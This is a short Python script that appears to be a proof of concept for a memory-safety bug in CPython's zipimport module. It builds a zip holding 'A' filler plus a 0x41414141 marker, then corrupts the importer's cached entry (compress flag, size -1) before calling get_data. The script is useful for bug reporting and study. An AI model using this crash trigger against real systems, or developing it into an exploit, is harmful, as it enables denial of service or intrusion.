import zipimport
import zipfile
import struct
import sys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'

payload = bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode='w')
zf.write(FILE)
zf.close()

importer = zipimport.zipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
importer._files[FILE] = tuple(f)
print(importer.get_data(FILE))
